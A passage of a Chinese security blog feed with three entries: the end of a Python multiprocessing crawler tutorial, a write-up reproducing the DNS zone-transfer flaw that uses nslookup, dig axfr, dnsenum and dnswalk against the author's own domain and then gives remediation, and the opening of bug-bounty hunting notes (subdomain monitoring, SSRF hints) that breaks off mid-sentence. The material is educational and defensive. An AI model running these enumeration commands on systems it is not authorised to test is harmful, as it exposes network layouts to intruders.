python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    r = requests.get(url)    <span class="comment">#访问url</span></span><br><span class="line">    <span class="keyword">return</span>(r.text)    <span class="comment">#返回html</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">soup_url</span><span class="params">(html)</span>:</span></span><br><span class="line">url_list = []</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'html.parser'</span>)    <span class="comment">#解析返回的html</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">url_list.append(<span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>]))    <span class="comment">#拼接博客文章的url</span></span><br><span class="line"><span class="keyword">return</span> (url_list)    <span class="comment">#返回博客文章url数组</span></span><br></pre></td></tr></table></figure><h1 id="0x03-测试普通爬取方法"><a href="#0x03-测试普通爬取方法" class="headerlink" title="0x03 测试普通爬取方法"></a>0x03 测试普通爬取方法</h1><p>这里先使用普通爬取的方法，也就是单线程测试一下，为了方便，下面提到的单线程处理方法，准确的来说是单进程单线程，同样的，下面提到的多进程准确的说法是多进程单线程，多线程准确的说则是单进程多线程。</p><p>值得注意的是爬取耗时根据自己的网络情况而定，即使碰到多进程耗时几百秒而单线程耗时几十秒也是正常的，这种情况是因为网络环境较差造成的，所以碰到结果出入很大的时候，可以多试几次，排除偶然性，下面就来上代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># 开始单线程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">url = <span class="string">'https://www.teamssix.com'</span></span><br><span class="line">html = req_url(url)</span><br><span class="line">home_page = soup_url(html)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> home_page:</span><br><span class="line">req_url(i)</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n单线程：'</span>,end_time - start_time)</span><br></pre></td></tr></table></figure><p>最终运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">单线程： 29.181440114974976</span><br></pre></td></tr></table></figure><p>单线程花费了 29 秒的时间，接下来使用多进程测试一下</p><h1 id="0x04-测试多进程爬取方法"><a href="#0x04-测试多进程爬取方法" class="headerlink" title="0x04 测试多进程爬取方法"></a>0x04 测试多进程爬取方法</h1><p>通过学习发现多进程的用法和多线程还是挺相似的，所以就直接放代码吧，感兴趣的可以看看参考文章。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># 开始多进程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">url = <span class="string">'https://www.teamssix.com'</span></span><br><span class="line">pool = Pool(<span class="number">4</span>)</span><br><span class="line">home_page = soup_url(req_url(url))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> home_page:</span><br><span class="line">pool.apply_async(req_url, args=(i,))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n多进程：'</span>,end_time - start_time)</span><br></pre></td></tr></table></figure><p>最终运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多进程： 12.674117088317871</span><br></pre></td></tr></table></figure><p>多进程仅用了 12 秒就完成了任务，经过多次测试，发现使用多进程基本上能比单线程快2倍以上。</p><p>为了看到多线程与多进程的差距，这里使用多线程处理了一下上面的操作，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment">#开始多线程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">url = <span class="string">'https://www.teamssix.com'</span></span><br><span class="line">thread_list = []</span><br><span class="line">home_page = soup_url(req_url(url))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> home_page:</span><br><span class="line">t = threading.Thread(target = req_url, args=(i,))</span><br><span class="line">thread_list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">i.join()</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n多线程：'</span>, end_time - start_time)</span><br></pre></td></tr></table></figure><p>最终运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多线程： 11.685778141021729</span><br></pre></td></tr></table></figure><p>看到这里可能会觉着，这多线程和多进程爬虫的时间也差不多呀，然而事实并非那么简单。</p><p>由于爬虫的大多数时间都耗在了请求等待响应中，所以在爬虫的时候使用多线程好像快了不少，但我以前写过一个笔记：<a href="https://www.teamssix.com/year/191104-101112.html">不一定有效率GIL</a><br>在这篇文章里演示了如果使用单线程和多线程处理密集计算任务，有时多线程反而会比单线程慢了不少，所以接下来就看看多进程处理密集计算任务的表现。</p><h1 id="0x05-处理密集计算任务耗时对比"><a href="#0x05-处理密集计算任务耗时对比" class="headerlink" title="0x05 处理密集计算任务耗时对比"></a>0x05 处理密集计算任务耗时对比</h1><p>直接上代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time  <span class="comment"># 测试爬取时间</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">math</span><span class="params">(i)</span>:</span></span><br><span class="line">result2 = <span class="number">2</span> ** i    <span class="comment">#执行幂运算</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment">#开始单线程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000000001</span>, <span class="number">250000000</span>):</span><br><span class="line">math(i)</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n单线程：'</span>,end_time - start_time)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始多进程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">pool = Pool(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000000001</span>, <span class="number">250000000</span>):</span><br><span class="line">pool.apply_async(math, args=(i,))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n多进程：'</span>,end_time - start_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始多线程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">thread_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000000001</span>, <span class="number">250000000</span>):</span><br><span class="line">t = threading.Thread(target = math, args=(i,))</span><br><span class="line">thread_list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">i.join()</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n多线程：'</span>, end_time - start_time)</span><br></pre></td></tr></table></figure><p>最终运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">单线程： 20.495169162750244</span><br><span class="line"></span><br><span class="line">多进程： 11.645867347717285</span><br><span class="line"></span><br><span class="line">多线程： 22.07299304008484</span><br></pre></td></tr></table></figure><p>通过运行结果可以很明显看出，单线程与多线程的耗时差距不大，但是多进程的耗时与之相比几乎快了一倍，所以平时为了提高效率是使用多线程还是多进程，也就很清楚了。</p><p>但如果平时想提高爬虫效率是用多线程还是多进程呢？毕竟他们效率都差不多，那么协程了解一下🧐</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>参考文章：<br><a href="https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-01-distributed-scraping/" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-01-distributed-scraping/</a><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017628290184064" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1016959663602400/1017628290184064</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前段时间学习了多线程，但在实际的情况中对于多线程的速度实在不满意，所以今天就来学学多进程分布式爬虫，在这里感谢莫烦的Python教程。&lt;/p&gt;
&lt;h1 id=&quot;0x01-什么是多进程爬虫&quot;&gt;&lt;a href=&quot;#0x01-什么是多进程爬虫&quot; class=&quot;headerlink&quot; title=&quot;0x01 什么是多进程爬虫&quot;&gt;&lt;/a&gt;0x01 什么是多进程爬虫&lt;/h1&gt;&lt;p&gt;在讲述多进程之前，先来回顾一下之前学习的多线程。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多进程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    
      <category term="分布式" scheme="https://www.teamssix.com/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】DNS域传送漏洞</title>
    <link href="https://www.teamssix.com/year/191206-172901.html"/>
    <id>https://www.teamssix.com/year/191206-172901.html</id>
    <published>2019-12-06T09:29:01.000Z</published>
    <updated>2019-12-06T09:40:28.088Z</updated>
    
    <content type="html"><![CDATA[<p>注：本文中使用的域名是不存在DNS域传送漏洞的，本文仅用作技术交流学习用途，严禁将该文内容用于违法行为。</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><p>DNS: 网域名称系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。</p><p>它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p><p>DNS使用TCP和UDP端口53，当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p>常用的DNS记录有以下几类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">主机记录(A记录)：</span><br><span class="line">A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。</span><br><span class="line"></span><br><span class="line">IPv6主机记录(AAAA记录)：</span><br><span class="line">与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。 </span><br><span class="line"></span><br><span class="line">别名(CNAME记录)：</span><br><span class="line">CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。</span><br><span class="line"></span><br><span class="line">电子邮件交换记录（MX记录)：</span><br><span class="line">记录一个邮件域名对应的IP地址</span><br><span class="line"></span><br><span class="line">域名服务器记录 (NS记录)：</span><br><span class="line">记录该域名由哪台域名服务器解析</span><br><span class="line"></span><br><span class="line">反向记录(PTR记录):</span><br><span class="line">也即从IP地址到域名的一条记录</span><br><span class="line"></span><br><span class="line">TXT记录：</span><br><span class="line">记录域名的相关文本信息</span><br></pre></td></tr></table></figure><p>DNS服务器分为主服务器，备份服务器，缓存服务器。</p><p>备份服务器需要利用“域传送”从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，万一主服务器挂了还有备份服务器顶着。</p><p>而“域传送”漏洞则是由于dns配置不当，本来只有备份服务器能获得主服务器的数据，由于漏洞导致任意client都能通过“域传送”获得主服务器的数据（zone数据库信息）。</p><p>这样，攻击者就能获得某个域的所有记录，甚至整个网络拓扑都暴露无遗，凭借这份网络蓝图，攻击者可以节省很多扫描时间以及信息收集的时间，还提升了准确度等等。</p><p>大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用 Private DNS。如果内部 DNS 泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。</p><h1 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h1><h2 id="1、Windows下使用nslookup"><a href="#1、Windows下使用nslookup" class="headerlink" title="1、Windows下使用nslookup"></a>1、Windows下使用nslookup</h2><p>nslookup命令以两种方式运行：非交互式和交互式。</p><p>1、非交互式模式下，查看对应主机域的域名服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~# nslookup -type=ns teamssix.com</span><br><span class="line"></span><br><span class="line">服务器:  ns-gg.online.ny.cn</span><br><span class="line">Address:  118.192.13.5</span><br><span class="line">非权威应答:</span><br><span class="line">teamssix.com    nameserver = clint.ns.cloudflare.com</span><br><span class="line">teamssix.com    nameserver = isla.ns.cloudflare.com</span><br></pre></td></tr></table></figure><p>2、进入交互模式，指定域名服务器，列出域名信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">~# nslookup</span><br><span class="line"></span><br><span class="line">默认服务器:  ns-gg.online.ny.cn</span><br><span class="line">Address:  118.192.13.5</span><br><span class="line"></span><br><span class="line">&gt; server clint.ns.cloudflare.com</span><br><span class="line"></span><br><span class="line">默认服务器:  clint.ns.cloudflare.com</span><br><span class="line">Addresses:  2400:cb00:2049:1::adf5:3b5a</span><br><span class="line">          2606:4700:58::adf5:3b5a</span><br><span class="line">          173.245.59.90</span><br><span class="line"></span><br><span class="line">&gt; ls teamssix.com</span><br><span class="line"></span><br><span class="line">ls: connect: No such file or directory</span><br><span class="line">*** 无法列出域 teamssix.com: Unspecified error</span><br><span class="line">DNS 服务器拒绝将区域 teamssix.com 传送到你的计算机。如果这不正确，</span><br><span class="line">请检查 IP 地址 2400:cb00:2049:1::adf5:3b5a 的 DNS 服务器上 teamssix.com 的</span><br><span class="line">区域传送安全设置。</span><br></pre></td></tr></table></figure><p>如果提示无法列出域，那就说明此域名不存在域传送漏洞。</p><h2 id="2、Kali下使用dig、dnsenum、dnswalk"><a href="#2、Kali下使用dig、dnsenum、dnswalk" class="headerlink" title="2、Kali下使用dig、dnsenum、dnswalk"></a>2、Kali下使用dig、dnsenum、dnswalk</h2><h3 id="a、dig"><a href="#a、dig" class="headerlink" title="a、dig"></a>a、dig</h3><p>这里涉及dig 一个重要的命令axfr，axfr 是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。</p><p>我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值。</p><p>dig的整体利用步骤基本和nslookup一致。</p><p>1、查看对应主机域的域名服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~# dig teamssix.com ns</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; teamssix.com ns</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 16945</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;teamssix.com.                  IN      NS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">teamssix.com.           5       IN      NS      clint.ns.cloudflare.com.</span><br><span class="line">teamssix.com.           5       IN      NS      isla.ns.cloudflare.com.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;; Query time: 6 msec</span><br><span class="line">;; SERVER: 10.18.37.7#54(10.18.37.7)</span><br><span class="line">;; WHEN: Fri Dec 06 03:30:37 EST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 83</span><br></pre></td></tr></table></figure><p>2、向该域名发送axfr 请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~# dig axfr @clint.ns.cloudflare.com teamssix.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr @clint.ns.cloudflare.com teamssix.com</span><br><span class="line">; (3 servers found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure><h3 id="b、dnsenum"><a href="#b、dnsenum" class="headerlink" title="b、dnsenum"></a>b、dnsenum</h3><p>这个工具相较于之前的方法要为简单，一行命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">~# dnsenum -enum teamssix.com</span><br><span class="line"></span><br><span class="line">Smartmatch is experimental at /usr/bin/dnsenum line 698.</span><br><span class="line">Smartmatch is experimental at /usr/bin/dnsenum line 698.</span><br><span class="line">dnsenum VERSION:1.2.4</span><br><span class="line">Warning: can&apos;t load Net::Whois::IP module, whois queries disabled.</span><br><span class="line">Warning: can&apos;t load WWW::Mechanize module, Google scraping desabled.</span><br><span class="line"></span><br><span class="line">-----   teamssix.com   -----</span><br><span class="line"></span><br><span class="line">Host&apos;s addresses:</span><br><span class="line">__________________</span><br><span class="line">teamssix.com.                            5        IN    A        104.28.22.70</span><br><span class="line">teamssix.com.                            5        IN    A        104.28.23.70</span><br><span class="line"></span><br><span class="line">Name Servers:</span><br><span class="line">______________</span><br><span class="line"></span><br><span class="line">isla.ns.cloudflare.com.                  5        IN    A        173.245.58.119</span><br><span class="line">clint.ns.cloudflare.com.                 5        IN    A        173.245.59.90</span><br><span class="line">clint.ns.cloudflare.com.                 5        IN    RRSIG             (</span><br><span class="line"></span><br><span class="line">Mail (MX) Servers:</span><br><span class="line">___________________</span><br><span class="line"></span><br><span class="line">Trying Zone Transfers and getting Bind Versions:</span><br><span class="line">_________________________________________________</span><br><span class="line"></span><br><span class="line">Trying Zone Transfer for teamssix.com on isla.ns.cloudflare.com ...</span><br><span class="line">AXFR record query failed: FORMERR</span><br><span class="line"></span><br><span class="line">Trying Zone Transfer for teamssix.com on clint.ns.cloudflare.com ...</span><br><span class="line">AXFR record query failed: FORMERR</span><br><span class="line"></span><br><span class="line">brute force file not specified, bay.</span><br></pre></td></tr></table></figure><h3 id="c、dnswalk"><a href="#c、dnswalk" class="headerlink" title="c、dnswalk"></a>c、dnswalk</h3><p>dnswalk的使用同样一条命令，但是注意在域名最后加上一个点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~# dnswalk teamssix.com.</span><br><span class="line"></span><br><span class="line">Checking teamssix.com.</span><br><span class="line">Getting zone transfer of teamssix.com. from clint.ns.cloudflare.com...failed</span><br><span class="line">FAIL: Zone transfer of teamssix.com. from clint.ns.cloudflare.com failed: FORMERR</span><br><span class="line">Getting zone transfer of teamssix.com. from isla.ns.cloudflare.com...failed</span><br><span class="line">FAIL: Zone transfer of teamssix.com. from isla.ns.cloudflare.com failed: FORMERR</span><br><span class="line">BAD: All zone transfer attempts of teamssix.com. failed!</span><br><span class="line">2 failures, 0 warnings, 1 errors.</span><br></pre></td></tr></table></figure><h1 id="0x02-修复建议"><a href="#0x02-修复建议" class="headerlink" title="0x02 修复建议"></a>0x02 修复建议</h1><p>区域传送是 DNS 常用的功能，为保证使用安全，应严格限制允许区域传送的主机，例如一个主 DNS 服务器应该只允许它的备用 DNS 服务器执行区域传送功能。</p><p>在相应的 zone、options 中添加 allow-transfer，对执行此操作的服务器进行限制。如：</p><ul><li><p>严格限制允许进行区域传送的客户端的 IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow-transfer ｛1.1.1.1; 2.2.2.2;｝</span><br></pre></td></tr></table></figure></li><li><p>设置 TSIG key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow-transfer ｛key &quot;dns1-slave1&quot;; key &quot;dns1-slave2&quot;;｝</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>最后感谢前辈们的文章与辛勤奉献，DNS域传送漏洞除了本文中讨论的方法外，也可以使用Python脚本或者万能的nmap，这里就不做讨论啦。</p><p>想写这篇文章已经想一周了，今天终于有时间给整理整理，另外前文发布的Pigat工具，最近也会修复一些bug提交到Github更新哒。</p><blockquote><p>更多信息欢迎关注我的个人公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="http://sunu11.com/2017/03/16/8/" target="_blank" rel="noopener">http://sunu11.com/2017/03/16/8/</a><br><a href="https://www.jianshu.com/p/d2af08e6f8fb" target="_blank" rel="noopener">https://www.jianshu.com/p/d2af08e6f8fb</a><br><a href="http://www.lijiejie.com/dns-zone-transfer-1/" target="_blank" rel="noopener">http://www.lijiejie.com/dns-zone-transfer-1/</a><br><a href="https://www.alibabacloud.com/help/zh/faq-detail/37529.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/37529.htm</a><br><a href="https://www.lsablog.com/networksec/awd/dns-zone-transfer/" target="_blank" rel="noopener">https://www.lsablog.com/networksec/awd/dns-zone-transfer/</a><br><a href="https://larry.ngrep.me/2015/09/02/DNS-zone-transfer-studying/" target="_blank" rel="noopener">https://larry.ngrep.me/2015/09/02/DNS-zone-transfer-studying/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;注：本文中使用的域名是不存在DNS域传送漏洞的，本文仅用作技术交流学习用途，严禁将该文内容用于违法行为。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="DNS" scheme="https://www.teamssix.com/tags/DNS/"/>
    
      <category term="域传送" scheme="https://www.teamssix.com/tags/%E5%9F%9F%E4%BC%A0%E9%80%81/"/>
    
  </entry>
  
  <entry>
    <title>【直播笔记】白帽子的成长之路</title>
    <link href="https://www.teamssix.com/year/191201-220910.html"/>
    <id>https://www.teamssix.com/year/191201-220910.html</id>
    <published>2019-12-01T14:09:10.000Z</published>
    <updated>2019-12-01T14:11:29.402Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>子域名监听工具：<a href="https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多" target="_blank" rel="noopener">https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多</a></p></li><li><p>关于挖掘src漏洞:</p></li></ul><ol><li>白帽子主要是寻找扫描器和风控系统覆盖不到的地方，比如domxss、越权漏洞和逻辑漏洞</li><li>开发运维人员的一些疏忽的点<a id="more"></a></li><li>还有因为厂商毕竟是赚钱是第一要务，因双十一、游戏活动之类紧急上线的业务并没有被安全部门测试过，这些通常会出现问题。</li><li>漏洞主要还是存在于交互处，也就是需要表单填写多的地方，这种场景大家应该会时常遇到。</li><li>漏洞利用，这是厂商和当前法律明令禁止的….请参考国外博客，和自己私下测试，还有纯刷src角度，我个人觉得别用扫描器扫厂商业务，他们一个payload打过去,封ip封账号不说，爬虫爬过去说不定你就收到一张传票或者被查水表，就进去了……</li></ol><ul><li><p>学习路径：<a href="https://mp.weixin.qq.com/s/nE8a4Z-qCXwOrvZXE-gLFg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nE8a4Z-qCXwOrvZXE-gLFg</a></p></li><li><p>SSRF无回显的挖掘方法：<a href="https://mp.weixin.qq.com/s/R-N9e0PfrWY2GluLrjLlww" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/R-N9e0PfrWY2GluLrjLlww</a></p></li></ul><ol><li>基本上useragent是来自容器的 都很大程度上存在这个漏洞</li><li>这个漏洞最简单的挖掘方法就是先尝试一遍外网 